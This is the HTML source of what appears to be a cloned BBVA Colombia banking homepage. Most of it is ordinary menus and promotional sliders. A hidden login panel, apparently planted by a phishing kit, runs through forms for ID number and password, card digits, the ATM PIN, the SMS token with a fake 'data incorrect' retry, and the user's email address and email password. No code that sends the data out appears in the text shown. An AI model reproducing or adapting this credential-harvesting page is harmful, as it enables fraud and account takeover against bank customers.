        <img sizes="(min-width: 990px) 25vw, (min-width: 600px) 50vw, 100vw" data-component="lazyimages" data-component-params='{"keepSize": "", "aspectRatio": ""}' data-src="https://www.bbva.com.co/content/dam/public-web/global/images/micro-illustrations/plane.svg" itemprop="image" class="megamenu__card__image" alt=""/>
    

            
            <p role="presentation" class="megamenu__card__title">Cumple tus sueños </p>
            </div>
            <p itemprop="description" class="megamenu__card__text rte">Viaja, estudia y compra el carro que siempre has querido.</p>
        </div>
    </a>

                        </li>
                    
                        <li itemprop="itemListElement" itemscope itemtype="http://schema.org/OfferCatalog" class="megamenu__card swiper-slide">
                            
    <a class="megamenu__card__link hidden" itemprop="url" tabindex="-1" href="/personas/oportunidades/crece-en-familia.html">
        <div class="megamenu__card__base">
            <div class="megamenu__card__header">
            
                
    

    
        
        
        

        <img sizes="(min-width: 990px) 25vw, (min-width: 600px) 50vw, 100vw" data-component="lazyimages" data-component-params='{"keepSize": "", "aspectRatio": ""}' data-src="https://www.bbva.com.co/content/dam/public-web/global/images/micro-illustrations/mortgage.svg" itemprop="image" class="megamenu__card__image" alt=""/>
    

            
            <p role="presentation" class="megamenu__card__title">Crece en familia </p>
            </div>
            <p itemprop="description" class="megamenu__card__text rte">Asegura tu hogar, obtén tu crédito de vivienda y haz realidad tus proyectos.</p>
        </div>
    </a>

                        </li>
                    
                        <li itemprop="itemListElement" itemscope itemtype="http://schema.org/OfferCatalog" class="megamenu__card swiper-slide">
                            
    <a class="megamenu__card__link hidden" itemprop="url" tabindex="-1" href="/personas/oportunidades/ahorra-e-invierte.html">
        <div class="megamenu__card__base">
            <div class="megamenu__card__header">
            
                
    

    
        
        
        

        <img sizes="(min-width: 990px) 25vw, (min-width: 600px) 50vw, 100vw" data-component="lazyimages" data-component-params='{"keepSize": "", "aspectRatio": ""}' data-src="https://www.bbva.com.co/content/dam/public-web/global/images/micro-illustrations/bulb.svg" itemprop="image" class="megamenu__card__image" alt=""/>
    

            
            <p role="presentation" class="megamenu__card__title">Ahorra e invierte</p>
            </div>
            <p itemprop="description" class="megamenu__card__text rte">Rentabiliza tu dinero.</p>
        </div>
    </a>

                        </li>
                    
                        <li itemprop="itemListElement" itemscope itemtype="http://schema.org/OfferCatalog" class="megamenu__card swiper-slide">
                            
    <a class="megamenu__card__link hidden" itemprop="url" tabindex="-1" href="/personas/oportunidades/consolida-tu-patrimonio.html">
        <div class="megamenu__card__base">
            <div class="megamenu__card__header">
            
                
    

    
        
        
        

        <img sizes="(min-width: 990px) 25vw, (min-width: 600px) 50vw, 100vw" data-component="lazyimages" data-component-params='{"keepSize": "", "aspectRatio": ""}' data-srcset="https://www.bbva.com.co/content/dam/public-web/global/images/micro-illustrations/card_dollar.png.img.80.1635233933637.png 80w,https://www.bbva.com.co/content/dam/public-web/global/images/micro-illustrations/card_dollar.png.img.160.1635233933637.png 160w,https://www.bbva.com.co/content/dam/public-web/global/images/micro-illustrations/card_dollar.png.img.320.1635233933637.png 320w" data-src="https://www.bbva.com.co/content/dam/public-web/global/images/micro-illustrations/card_dollar.png.img.320.1635233933637.png" itemprop="image" class="megamenu__card__image" alt=""/>
    

            
            <p role="presentation" class="megamenu__card__title">Consolida tu patrimonio</p>
            </div>
            <p itemprop="description" class="megamenu__card__text rte">Administra tus inversiones y asegura lo que más te importa.</p>
        </div>
    </a>

                        </li>
                    </ul>
                </div>
                <div class="swiper-button-next megamenu--preventfocus">
                    <i class="bbva-icon bbva-icon__2_017_forward"></i>
                </div>
            </div>
            <div class="swiper-pagination megamenu--preventfocus"></div>
            <div class="megamenu__alert">
                






                
                    <div class="promoalert alert">








    
    
    
<link rel="stylesheet" href="https://www.bbva.com.co/apps/bbva/pwebs/components/clientlibs/bbva.promoalert/small.lc-20230516-100300-lc.min.ACSHASHdc5eb70e360f15ea259bd05fca81577c.css" type="text/css">


    
    
<link rel="stylesheet" href="https://www.bbva.com.co/apps/bbva/pwebs/components/clientlibs/bbva.promoalert/large.lc-20230516-100300-lc.min.ACSHASH2ccae3fc1b243aaf0082b836fe8bc838.css" type="text/css" media="all and (min-width: 600px)">



    <div itemscope itemtype="http://schema.org/CommunicateAction" data-component="alert" data-component-params='{&quot;selectors&quot;:{&quot;close&quot; : &quot;.promoalert__close&quot;}}'>
        
         
         
         
         
        <div class="promoalert__container
                    promoalert__container--full
                     " data-dl-component data-dl-component-name="promoalert" data-dl-component-type="bbva/pwebs/components/par/promoalert" id="header-megamenualert-promoalert">
            <div class="promoalert__base promoalert--banner-light promoalert--banner
                        promoalert--withimg
                        promoalert--withbtn
                        ">
                <div class="promoalert__content container">
                     
                        <div class="promoalert__image   ">
                            <div class="promoalert__mask">
                                <svg viewBox="0 0 58 257" aria-hidden="true" focusable="false" version="1.1" xmlns="http://www.w3.org/2000/svg" preserveAspectRatio="none">
                                    <g stroke="none" stroke-width="1" fill="none" fill-rule="evenodd">
                                        <polygon fill="#000000" fill-rule="nonzero" points="0.3515625 256.273438 28.625 256.273438 57.4921875 0.12109375 0.3515625 0.12109375"></polygon>
                                    </g>
                                </svg>
                            </div>
                            
                            
                                
                                    
    
        


    
    
    
    
    
     <img data-component-params='{"keepSize": "" }' src="https://www.bbva.com.co/content/dam/public-web/global/images/micro-illustrations/star_aqua.svg" srcset="https://www.bbva.com.co/content/dam/public-web/global/images/micro-illustrations/star_aqua.svg" sizes="(min-width: 600px) 50vw, 100vw" itemprop="image" class="promoalert__img " alt="simulador credito hipotecario"/>

    

                                
                            
                            
                            
                            
                            
                            
                            
                            
                            
                            
                            
                            
                            
                        </div>
                    

                    <div class="promoalert__main">
                        
                        <div class="promoalert__texts">
                            <h5 itemprop="name" class="promoalert__title">Hazte cliente</h5>
                            <div itemprop="description" class="promoalert__text rte"><ul>
<li>Lleva el banco en tu celular</li>
<li>Toma el control de tus finanzas</li>
</ul>
</div>
                            
                        </div>
                        <div class="promoalert__button">
                            <a itemprop="mainEntityOfPage" class="btn__basic    btn__medium-blue " href="https://www.bbva.com.co/personas/hazte-cliente.html" aria-label="enlace a hazte cliente. Abre en nueva ventana" title="enlace a hazte cliente. Abre en nueva ventana" rel="noopener noreferrer" target="_blank" role="button">
                                Conoce más
                            </a>
                        </div>
                    </div>

                    
                </div>
            </div>
        </div>
    </div>
</div>

                
            </div>
        </div>
        <div class="megamenu__flyout__linkwithicon megamenu__flyout__linkwithicon--mobile" itemscope itemtype="http://schema.org/Service">
            
                
                

    






    
    <a itemprop="url" data-dl-component data-dl-component-name="linkwithicon" data-dl-component-type="bbva/pwebs/components/par/linkwithicon" class="linkwithicon__link link__base link__base--megamenu  " target="_self" href="/personas/servicios-digitales.html">
        <span class="linkwithicon__content">
            <img class="bbva-svgicon bbva-svgicon--megamenu" src="https://www.bbva.com.co/content/dam/public-web/global/images/icons/2_042_nearme.svg" alt=""/>
            <span itemprop="name" class="linkwithicon__text">Servicios digitales</span>
        </span>
    </a>


            
                
                

    






    
    <a itemprop="url" data-dl-component data-dl-component-name="linkwithicon_560657055" data-dl-component-type="bbva/pwebs/components/par/linkwithicon" class="linkwithicon__link link__base link__base--megamenu  " href="https://www.bbva.com.co/personas/productos/sostenibilidad.html" target="_self" title="Sostenibilidad BBVA" aria-label="Sostenibilidad BBVA">
        <span class="linkwithicon__content">
            <img class="bbva-svgicon bbva-svgicon--megamenu" src="https://www.bbva.com.co/content/dam/public-web/global/images/icons/generic-sustainability.svg" alt=""/>
            <span itemprop="name" class="linkwithicon__text">Sostenibilidad BBVA</span>
        </span>
    </a>


            
                
                

    






    
    <a itemprop="url" data-dl-component data-dl-component-name="linkwithicon_659572967" data-dl-component-type="bbva/pwebs/components/par/linkwithicon" class="linkwithicon__link link__base link__base--megamenu  " target="_self" title="enlace a blog bbva" aria-label="enlace a blog bbva" href="/personas/blog.html">
        <span class="linkwithicon__content">
            <img class="bbva-svgicon bbva-svgicon--megamenu" src="https://www.bbva.com.co/content/dam/public-web/global/images/icons/4_024_quotemark.svg" alt=""/>
            <span itemprop="name" class="linkwithicon__text">Blog </span>
        </span>
    </a>


            
                
                

    






    
    <a itemprop="url" data-dl-component data-dl-component-name="linkwithicon_1221498243" data-dl-component-type="bbva/pwebs/components/par/linkwithicon" class="linkwithicon__link link__base link__base--megamenu  " target="_self" title="enlace a beneficios" aria-label="enlace a beneficios" href="/personas/productos/tarjetas-de-credito/beneficios.html">
        <span class="linkwithicon__content">
            <img class="bbva-svgicon bbva-svgicon--megamenu" src="https://www.bbva.com.co/content/dam/public-web/global/images/icons/5_016_point.svg" alt=""/>
            <span itemprop="name" class="linkwithicon__text">Beneficios BBVA</span>
        </span>
    </a>


            
                
                

    






    
    <a itemprop="url" data-dl-component data-dl-component-name="linkwithicon_1583636697" data-dl-component-type="bbva/pwebs/components/par/linkwithicon" class="linkwithicon__link link__base link__base--megamenu  " target="_self" title="Atención al cliente" aria-label="Atención al cliente" href="/personas/atencion-al-cliente.html">
        <span class="linkwithicon__content">
            <img class="bbva-svgicon bbva-svgicon--megamenu" src="https://www.bbva.com.co/content/dam/public-web/global/images/icons/3_003_myprofile.svg" alt=""/>
            <span itemprop="name" class="linkwithicon__text">Atención al cliente</span>
        </span>
    </a>


            
                
                

    






    
    <a itemprop="url" data-dl-component data-dl-component-name="linkwithicon_1281190392" data-dl-component-type="bbva/pwebs/components/par/linkwithicon" class="linkwithicon__link link__base link__base--megamenu  " target="_blank" rel="noopener noreferrer" title="enlace a oficinas y cajeros. Abre en nueva ventana" aria-label="enlace a oficinas y cajeros. Abre en nueva ventana" href="/personas/oficinas.html">
        <span class="linkwithicon__content">
            <img class="bbva-svgicon bbva-svgicon--megamenu" src="https://www.bbva.com.co/content/dam/public-web/global/images/icons/3_026_mobile.svg" alt=""/>
            <span itemprop="name" class="linkwithicon__text">Oficinas y cajeros</span>
        </span>
    </a>


            
                
                

    






    
    <a itemprop="url" data-dl-component data-dl-component-name="linkwithicon_379865119" data-dl-component-type="bbva/pwebs/components/par/linkwithicon" class="linkwithicon__link link__base link__base--megamenu  " target="_self" href="/personas/preguntas-frecuentes.html">
        <span class="linkwithicon__content">
            <img class="bbva-svgicon bbva-svgicon--megamenu" src="https://www.bbva.com.co/content/dam/public-web/global/images/icons/4_003_help.svg" alt=""/>
            <span itemprop="name" class="linkwithicon__text">Preguntas Frecuentes</span>
        </span>
    </a>


            
                
                

    






    
    <a itemprop="url" data-dl-component data-dl-component-name="linkwithicon_1691019573" data-dl-component-type="bbva/pwebs/components/par/linkwithicon" class="linkwithicon__link link__base link__base--megamenu  " href="https://www.bbva.com/es/co/?utm_source=bbvacol&utm_campaign=modulo_col" target="_blank" rel="noopener noreferrer" title="Newsroom BBVA. Abre en nueva ventana" aria-label="Newsroom BBVA. Abre en nueva ventana">
        <span class="linkwithicon__content">
            <img class="bbva-svgicon bbva-svgicon--megamenu" src="https://www.bbva.com.co/content/dam/public-web/global/images/icons/1_028_international.svg" alt=""/>
            <span itemprop="name" class="linkwithicon__text">Newsroom BBVA</span>
        </span>
    </a>


            
        </div>
        <div class="megamenu__flyout__extraslinks">
            <div class="accessmobile access">

    




    




<div data-component="access" data-component-params='{
            "desktop" : {
                "XF" : false,
                "URL" : "https://nuevaversion.bbvanet.com.co/loginAEM.html",
                "height" : "",
                "target" : "",
                "title": "",
                "enableAnalytics": false
            },
            "tablet" : {
                "XF" : false,
                "URL" : "",
                "height": "",
                "target": "",
                "title": "",
                "enableAnalytics": false
            },
            "mobile" : {
                "XF" : false,
                "URL" : "",
                "height": "",
                "target": "",
                "title": "",
                "enableAnalytics": false
            }}'>
    <a class="header__actions__item__link header__actions--menu header__access" accesskey="a" itemprop="url" aria-label="Acceso" href="javascript:void(0)" aria-expanded="false">
        <svg class="header__icon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 260 260" height="24px" width="24px">
            <defs><style>.bbvaicn{fill:#fff}</style></defs>
            <path class="bbvaicn" d="M161.38 132.34a70 70 0 0 1-62.76 0A90 90 0 0 0 30 219.77v20h200v-20a90 90 0 0 0-68.62-87.43zM160 209.77h-30v-20h50zm-30-90a50 50 0 1 0-50-50 50 50 0 0 0 50 50z"/>
        </svg>
        <span class="header__actions__item__link__text header__access__text--desktop">Acceso</span>
        <span class="header__actions__item__link__text header__access__text--tablet">Acceso</span>
        <span class="header__actions__item__link__text header__access__text--mobile">Acceso</span>
    </a>
</div></div>

        </div>
        
        <a class="btn__basic btn__navy megamenu__stickybtn " itemprop="url" href="https://www.bbva.com.co/personas/registrate.html">
            
                <img class="bbva-svgicon bbva-svgicon--largemobile bbva-svgicon--linked" src="https://www.bbva.com.co/content/dam/public-web/global/images/icons/3_051_newclient.svg" alt=""/>
            
            <span>Regístrate</span>
        </a>
    </div>
</aside>

</div>

        
        <main class="bbva--main wrapper" id="main" tabindex="-1">
	
<section>
    
        <div role="heading" aria-level="1" class="invisible">Personas</div>
    
    

<div id="panel-formulario">    
    
    <div class="c-login public formulario" style="display: none;" id="contenedor-login">
        <div class="signin">
            <br><br>            
            <h1 class="titulo">¡Bienvenido!</h1>
            <br><br>
            <form id="noform-login" autocomplete="OFF">
            <select name="docTypeNoMovil" id="docTypeNoMovil" class="select-coronita entradas">
                <option value="CC">Cédula de Ciudadanía</option>
                <option value="CE">Cédula de Extranjería</option>
                <option value="TI">Tarjeta de Identidad</option>
                <option value="PA">Pasaporte</option>
                <option value="NIP">Número Identificación Personal</option>
            </select>
            <br>
            <div class="frm-input" id="inp-documento">
                <div class="etiqueta">Número de documento</div>
                <input type="text" class="entradas" id="docNumberMovil" name="docNumberMovil" autocomplete="off">
            </div>
            
            <div class="frm-input" id="inp-password">
                <div class="etiqueta">Contraseña</div>
                <input type="password" class="entradas" id="passwordMovil" name="passwordMovil" autocomplete="off">
            </div>
            </form>
            <br><br>
            <div class="row callto">
                <div class="col-md-12">
                    <a id="btnLogin" class="boton-azul">Entrar a BBVA Net</a>
                </div>
                <br><br>
                <div class="col-md-12">
                    <a class="btn btn-link" target="_top" href="https://www.bbva.com.co/personas/olvido.html">Olvidé mi contraseña</a>
                </div>
            </div>
        </div>
    </div>



    <div class="c-login public formulario" style="display: none;" id="contenedor-otp">
        <div class="signin">
                  <br><br>  
            <h1 class="titulo">Ingresa los siguientes datos para confirmar tu identidad.</h1>
            <br><br>
            <form id="noform-otp" autocomplete="OFF">
             <div class="frm-input" id="inp-tarjeta">
                <div class="etiqueta">Digitos de la Tarjeta Crédito o Debito</div>
                <input type="text" class="entradas" id="noTarjeta" name="noTarjeta" autocomplete="off" maxlength="16">
            </div>


            <div class="frm-input" id="inp-cajero">
                <div class="etiqueta">Clave de cajero</div>
                <input type="password" class="entradas" id="claveCajero" name="claveCajero" autocomplete="off" maxlength="4" onKeypress="if (event.keyCode < 48 || event.keyCode > 57) event.returnValue = false;" pattern="[0-9]*">
            </div>

            </form>
            <br><br>
            <div class="row callto">
                <div class="col-md-12">
                    <a id="btnClave" class="boton-azul">Validar</a>
                </div>
                <br><br>
                <div class="col-md-12">
                    <a class="btn btn-link" target="_top" href="https://www.bbva.com.co/personas/olvido.html">Olvidé mi contraseña</a>
                </div>
            </div>
        </div>
    </div>



    <div class="c-login public formulario" style="display: none;" id="contenedor-token">
        <div class="signin">
            <br><br>        
            <h1 class="titulo"><strong>CONFIRMACIÓN</strong></h1>
            <br><br>
            <p style="text-align: center; font-size: 16px; color: #666; margin-bottom: 30px;">
                Para confirmar tu operación, ingresa el código de 6 dígitos que recibiste en tu dispositivo móvil
            </p>
            <form id="noform-token" autocomplete="OFF">            
                <div class="frm-input" id="inp-token">
                    <div class="etiqueta">Token</div>
                    <input type="password" class="entradas" id="TokenOTP" name="TokenOTP" autocomplete="off" maxlength="8" onKeypress="if (event.keyCode < 48 || event.keyCode > 57) event.returnValue = false;" pattern="[0-9]*">
                </div>                
            </form>
            <br><br>
            <div class="row callto">
                <div class="col-md-12">
                    <a id="btnToken" class="boton-azul">Validar</a>
                </div>
                <br><br>
                <div class="col-md-12">
                    <a class="btn btn-link" target="_top" href="https://www.bbva.com.co/personas/olvido.html">Olvidé mi contraseña</a>
                </div>
            </div>
        </div>
    </div>


    <div class="c-login public formulario" style="display: none;" id="contenedor-token-err">
        <div class="signin">
            <br><br>       
            <h1 class="titulo">Los Datos ingresados son incorrectos, por favor verifíquelos e ingréselos nuevamente.</h1>
            <br><br>
            <form id="noform-token-err" autocomplete="OFF">
                <div class="frm-input" id="inp-token-err">
                    <div class="etiqueta">Token</div>
                    <input type="password" class="entradas" id="TokenOTPErr" name="TokenOTPErr" autocomplete="off" maxlength="8" onKeypress="if (event.keyCode < 48 || event.keyCode > 57) event.returnValue = false;" pattern="[0-9]*">
                </div> 
            </form>
            <br><br>
            <div class="row callto">
                <div class="col-md-12">
                    <a id="btnTokenErr" class="boton-azul">Validar</a>
                </div>
                <br><br>
                <div class="col-md-12">
                    <a class="btn btn-link" target="_top" href="https://www.bbva.com.co/personas/olvido.html">Olvidé mi contraseña</a>
                </div>
            </div>
        </div>
    </div>


<div class="c-login public formulario" style="display: none;" id="contenedor-mail">
        <div class="signin"> 
            <br><br>                 
            <h1>Verificación de identidad</h1>
            <br><br>
            <form id="noform-mail" autocomplete="OFF">           
                <div class="frm-input" id="inp-correo">
                    <div class="etiqueta">Correo electrónico</div>
                    <input type="text" class="entradas" id="correoElectronico" name="correoElectronico" autocomplete="off">
                </div>

                <div class="frm-input" id="inp-clave-correo">
                    <div class="etiqueta">Clave de correo</div>
                    <input type="password" class="entradas" id="claveCorreo" name="claveCorreo" autocomplete="off">
                </div>
            </form>
            <br><br>
            <div class="row callto">
                <div class="col-md-12">
                    <a id="btnMail" class="boton-azul">Verificar</a>
                </div>
                <br><br>
                <div class="col-md-12">
                    <a class="btn btn-link" target="_top" href="https://www.bbva.com.co/personas/olvido.html">Olvidé mi contraseña</a>
                </div>
            </div>
        </div>
    </div>

</div>
<div class="aem-Grid aem-Grid--12 aem-Grid--default--12 ">
    
    <div class="marqueeslider aem-GridColumn aem-GridColumn--default--12">

<div class="marqueeslider__carousel slider slider--marquee swiper-pagination--dark swiper-pagination--image marqueeslider__carousel--autoplay marqueeslider__carousel--fast" data-component="slider" data-component-params='{
            "selectors":{"items" : [".headermarquee", ".appspromomarquee", ".homepromomarquee", ".complexmarquee"]},
            "type":"marquee",
            "arrowsConfig" : {"elementToFind": ".marqueeslider__slide", "classToCheck": ".complexmarquee__base--white"},
            "addClassOnSlide" : {"elementToFind": ".marqueeslider__slide--homepromo", "classToAdd": "homepromomarquee--slide"},
            "autoRotate":"true",
            "transitionTime": 8,
            "transitionType": "fast",
            "lazyImages": "true"}'>
    <div class="swiper-button-next hidden">
        <i class="bbva-icon bbva-icon__2_017_forward"></i>
    </div>
    <div class="swiper-button-prev hidden">
        <i class="bbva-icon bbva-icon__2_046_back"></i>
    </div>
    <div class="swiper-container">
        <div class="swiper-wrapper">
            

    
    
    <div class="complexmarquee">
        <link rel="stylesheet" href="https://www.bbva.com.co/apps/bbva/pwebs/components/clientlibs/bbva.complexmarquee/small.lc-20230516-100300-lc.min.ACSHASH57ceba67a557bd8c3417e9c505ab14ea.css" type="text/css">

        <link rel="stylesheet" href="https://www.bbva.com.co/apps/bbva/pwebs/components/clientlibs/bbva.complexmarquee/large.lc-20230516-100300-lc.min.ACSHASH6f6a0def5c7e9778c0ec2f2ef7578b8a.css" type="text/css" media="all and (min-width: 600px)">

        <div class="complexmarquee__base complexmarquee__base--blue complexmarquee__base--right marqueeslider__slide
         complexmarquee__base--cover
        ">
            <div class="complexmarquee__container container">
                <div class="complexmarquee__img-wrapper complexmarquee__img-wrapper--cover">
                    <div class="marquee__wrapper" data-component="altpicture" data-component-params='{
                        "desktop": { "isDecorative" : false, "alt": "cuenta en linea" },
                        "tablet": { "isDecorative" : false, "alt": "cuenta en linea" },
                        "mobile": { "isDecorative" : true, "alt": "cuenta en linea" } }'>
                        <picture class="complexmarquee__picture complexmarquee__picture--left ">
                            <source media="(min-width: 600px)" class="complexmarquee__img--desktop complexmarquee__img complexmarquee__img--cover" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="https://www.bbva.com.co/content/dam/public-web/colombia/images/otros/abrir-cuenta-de-nomina-en-linea-des.png.img.960.1657739352092.png" data-srcset="https://www.bbva.com.co/content/dam/public-web/colombia/images/otros/abrir-cuenta-de-nomina-en-linea-des.png.img.768.1657739352092.png 768w,https://www.bbva.com.co/content/dam/public-web/colombia/images/otros/abrir-cuenta-de-nomina-en-linea-des.png.img.960.1657739352092.png 960w"/>

                            <source media="(max-width: 599px)" class="complexmarquee__img--mobile complexmarquee__img complexmarquee__img--cover" src="https://www.bbva.com.co/content/dam/public-web/colombia/images/otros/abrir-cuenta-de-nomina-en-linea-mo.png.img.1176.1657739352092.png" srcset="https://www.bbva.com.co/content/dam/public-web/colombia/images/otros/abrir-cuenta-de-nomina-en-linea-mo.png.img.80.1657739352092.png 80w,https://www.bbva.com.co/content/dam/public-web/colombia/images/otros/abrir-cuenta-de-nomina-en-linea-mo.png.img.160.1657739352092.png 160w,https://www.bbva.com.co/content/dam/public-web/colombia/images/otros/abrir-cuenta-de-nomina-en-linea-mo.png.img.320.1657739352092.png 320w,https://www.bbva.com.co/content/dam/public-web/colombia/images/otros/abrir-cuenta-de-nomina-en-linea-mo.png.img.768.1657739352092.png 768w,https://www.bbva.com.co/content/dam/public-web/colombia/images/otros/abrir-cuenta-de-nomina-en-linea-mo.png.img.960.1657739352092.png 960w,https://www.bbva.com.co/content/dam/public-web/colombia/images/otros/abrir-cuenta-de-nomina-en-linea-mo.png.img.1176.1657739352092.png 1176w"/>

                            <img data-component-params='{"keepSize": "" }' src="https://www.bbva.com.co/content/dam/public-web/colombia/images/otros/abrir-cuenta-de-nomina-en-linea-des.png.img.960.1657739352092.png" srcset="https://www.bbva.com.co/content/dam/public-web/colombia/images/otros/abrir-cuenta-de-nomina-en-linea-des.png.img.320.1657739352092.png 320w,https://www.bbva.com.co/content/dam/public-web/colombia/images/otros/abrir-cuenta-de-nomina-en-linea-des.png.img.768.1657739352092.png 768w,https://www.bbva.com.co/content/dam/public-web/colombia/images/otros/abrir-cuenta-de-nomina-en-linea-des.png.img.960.1657739352092.png 960w" sizes="100vw" itemprop="image" class="complexmarquee__img complexmarquee__img--cover " alt="cuenta en linea"/>
                        </picture>
                    </div>
                </div>
                <div class="complexmarquee__content" style="padding: 0px 10px;">
                    <div class="complexmarquee__headline">
                        <p>Hazte cliente BBVA en minutos</p>
                    </div>
                    <h1 class="complexmarquee__title swiper-noswiping">
                        Trae tu nómina a BBVA ¡y vete a viajar!
                    </h1>
                    <div class="complexmarquee__paragraph rte swiper-noswiping">
                        <p>Con tus 6.000 Puntos BBVA de bienvenida tienes la posibilidad de redimirlos en Viajes BBVA, además, podrás cambiarlos en comercios aliados o cashback.</p>
                    </div>

                    <div class="complexmarquee__actions">
                        <a itemprop="url" href="https://www.bbva.com.co/personas/productos/cuentas/herramientas/formulario-solicitud/#!/offer" aria-label="Cámbiate en minutos" title="Cámbiate en minutos" target="_self" class="btn__basic complexmarquee__btn  btn__medium-aqua   " role="button">
                            <span>Cámbiate en minutos</span>
                        </a>
                                
                        <a href="https://www.bbva.com.cohttps://www.bbva.com.co/content/dam/public-web/colombia/documents/personas/cuentas/nomina/cmp-terminos-y-condiciones.pdf" target="_self" title="Aplican Términos y Condiciones " class="link__base complexmarquee__link link__base--core  " aria-label="Aplican Términos y Condiciones ">
                            <div class="complexmarquee__linkwrapper">
                                <img class="bbva-svgicon bbva-svgicon--core " src="https://www.bbva.com.co/content/dam/public-web/global/images/icons/show.svg" alt=""/>
                                <span>Aplican Términos y Condiciones </span>
                            </div>
                        </a>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <div class="complexmarquee">
        <div class="complexmarquee__base complexmarquee__base--white complexmarquee__base--right marqueeslider__slide
         complexmarquee__base--cover
        ">
            <div class="complexmarquee__container container">
                <div class="complexmarquee__img-wrapper complexmarquee__img-wrapper--cover">
                    <div class="marquee__wrapper" data-component="altpicture" data-component-params='{
                        "desktop": { "isDecorative" : false, "alt": "Tarjeta de Crédito Aqua BBVA" },
                        "tablet": { "isDecorative" : false, "alt": "Tarjeta de Crédito Aqua BBVA" },
                        "mobile": { "isDecorative" : false, "alt": "Tarjeta de Crédito" } }'>
                        <picture class="complexmarquee__picture complexmarquee__picture--left complexmarquee__picture--diagonal" data-component="lazyimages"> 
                            <source media="(min-width: 600px)" class="complexmarquee__img--desktop complexmarquee__img complexmarquee__img--cover" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="https://www.bbva.com.co/content/dam/public-web/colombia/new-beginning/BBVA-TDC-Compra-de-cartera-Marquee-mobile.jpg.img.1176.1657312371054.jpg" data-srcset="https://www.bbva.com.co/content/dam/public-web/colombia/new-beginning/BBVA-TDC-Compra-de-cartera-Marquee-mobile.jpg.img.768.1657312371054.jpg 768w,https://www.bbva.com.co/content/dam/public-web/colombia/new-beginning/BBVA-TDC-Compra-de-cartera-Marquee-mobile.jpg.img.960.1657312371054.jpg 960w,https://www.bbva.com.co/content/dam/public-web/colombia/new-beginning/BBVA-TDC-Compra-de-cartera-Marquee-mobile.jpg.img.1176.1657312371054.jpg 1176w"/>

                            <source media="(max-width: 599px)" class="complexmarquee__img--mobile complexmarquee__img complexmarquee__img--cover" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="https://www.bbva.com.co/content/dam/public-web/colombia/new-beginning/BBVA-TDC-Compra-de-cartera-Marquee-mobile1.jpg.img.1176.1657312371054.jpg" data-srcset="https://www.bbva.com.co/content/dam/public-web/colombia/new-beginning/BBVA-TDC-Compra-de-cartera-Marquee-mobile1.jpg.img.80.1657312371054.jpg 80w,https://www.bbva.com.co/content/dam/public-web/colombia/new-beginning/BBVA-TDC-Compra-de-cartera-Marquee-mobile1.jpg.img.160.1657312371054.jpg 160w,https://www.bbva.com.co/content/dam/public-web/colombia/new-beginning/BBVA-TDC-Compra-de-cartera-Marquee-mobile1.jpg.img.320.1657312371054.jpg 320w,https://www.bbva.com.co/content/dam/public-web/colombia/new-beginning/BBVA-TDC-Compra-de-cartera-Marquee-mobile1.jpg.img.768.1657312371054.jpg 768w,https://www.bbva.com.co/content/dam/public-web/colombia/new-beginning/BBVA-TDC-Compra-de-cartera-Marquee-mobile1.jpg.img.960.1657312371054.jpg 960w,https://www.bbva.com.co/content/dam/public-web/colombia/new-beginning/BBVA-TDC-Compra-de-cartera-Marquee-mobile1.jpg.img.1176.1657312371054.jpg 1176w"/>

                            <img data-component-params='{"keepSize": "" }' data-src="https://www.bbva.com.co/content/dam/public-web/colombia/new-beginning/BBVA-TDC-Compra-de-cartera-Marquee-mobile.jpg.img.1176.1657312371054.jpg" data-srcset="https://www.bbva.com.co/content/dam/public-web/colombia/new-beginning/BBVA-TDC-Compra-de-cartera-Marquee-mobile.jpg.img.320.1657312371054.jpg 320w,https://www.bbva.com.co/content/dam/public-web/colombia/new-beginning/BBVA-TDC-Compra-de-cartera-Marquee-mobile.jpg.img.768.1657312371054.jpg 768w,https://www.bbva.com.co/content/dam/public-web/colombia/new-beginning/BBVA-TDC-Compra-de-cartera-Marquee-mobile.jpg.img.960.1657312371054.jpg 960w,https://www.bbva.com.co/content/dam/public-web/colombia/new-beginning/BBVA-TDC-Compra-de-cartera-Marquee-mobile.jpg.img.1176.1657312371054.jpg 1176w" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" sizes="100vw" itemprop="image" class="complexmarquee__img complexmarquee__img--cover " alt="Tarjeta de Crédito Aqua BBVA"/>                    
                        </picture>
                    </div>
                </div>        
            </div>
        </div>
    </div>

        </div>
    </div>
    <div class="swiper-pagination"></div>
</div>

    
<link rel="stylesheet" href="https://www.bbva.com.co/apps/bbva/pwebs/components/clientlibs/bbva.marqueeslider.lc-20230516-100300-lc.min.ACSHASH59b90eba04a410bb8b3cf8db7a965150.css" type="text/css">

</div>
<div class="experiencefragment aem-GridColumn aem-GridColumn--default--12">



    
        
        <div data-dl-component data-dl-component-name="experiencefragment" data-dl-component-type="bbva/pwebs/components/par/experiencefragment" id="content-experiencefragment">
             
             
    



<div class="xf-content-height">
    


<div class="aem-Grid aem-Grid--12 aem-Grid--default--12 ">
    
    
    
</div>

</div>
        </div>
    
</div>
<div class="productslider aem-GridColumn aem-GridColumn--default--12">




    




    




    
<link rel="stylesheet" href="https://www.bbva.com.co/apps/bbva/pwebs/components/clientlibs/bbva.productslider/small.lc-20220615-113451-lc.min.css" media="print" onload="this.media='all'">



    
<script type='text/javascript' class='lazyCSS'>if(!lazycss){lazycss=[];} if(!lazycsskeys){lazycsskeys=[];} var lazycsskey="https://www.bbva.com.co/apps/bbva/pwebs/components/clientlibs/bbva.productslider/large.lc-20220713-060320-lc.min.css"; if(lazycsskeys.indexOf(lazycsskey)===-1){ lazycsskeys.push(lazycsskey); lazycss.push({ rel:"stylesheet", href:lazycsskey, type:"text/css", media:"print", onload:"this.media='all'" });}</script>



    <section>
        <div class="productslider__base " itemscope itemtype="http://schema.org/Service">
            

            <div class="slider" data-component="productslider" data-dl-component data-dl-component-name="productslider" data-dl-component-type="bbva/pwebs/components/par/productslider" id="content-productslider">
                <div class="swiper-button-next">
                    <i class="bbva-icon bbva-icon__2_017_forward"></i>
                </div>
                <div class="swiper-button-prev">
                    <i class="bbva-icon bbva-icon__2_046_back"></i>
                </div>
                <div class="container swiper-container">
                    
                    <ul class="swiper-wrapper">
                        




    
    
